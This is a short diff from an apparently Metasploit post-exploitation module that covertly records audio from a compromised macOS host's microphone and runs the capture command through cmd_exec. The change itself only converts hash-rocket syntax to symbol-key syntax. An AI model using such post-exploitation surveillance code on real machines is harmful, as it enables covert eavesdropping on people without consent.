@@ -53,19 +53,19 @@ class Metasploit3 < Msf::Post
     num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
     tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
     ruby_cmd = osx_capture_media(
-      :action => action.name.downcase,
-      :snap_filetype => '',
-      :audio_enabled => true,
-      :video_enabled => false,
-      :num_chunks => num_chunks,
-      :chunk_len => datastore['SYNC_WAIT'],
-      :video_device => 0,
-      :audio_device => datastore['MIC_INDEX'],
-      :snap_jpg_compression => 0,
-      :video_compression => '',
-      :audio_compression => datastore['AUDIO_COMPRESSION'],
-      :record_file => tmp_file,
-      :snap_file => tmp_file
+      action: action.name.downcase,
+      snap_filetype: '',
+      audio_enabled: true,
+      video_enabled: false,
+      num_chunks: num_chunks,
+      chunk_len: datastore['SYNC_WAIT'],
+      video_device: 0,
+      audio_device: datastore['MIC_INDEX'],
+      snap_jpg_compression: 0,
+      video_compression: '',
+      audio_compression: datastore['AUDIO_COMPRESSION'],
+      record_file: tmp_file,
+      snap_file: tmp_file
     )
 
     output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
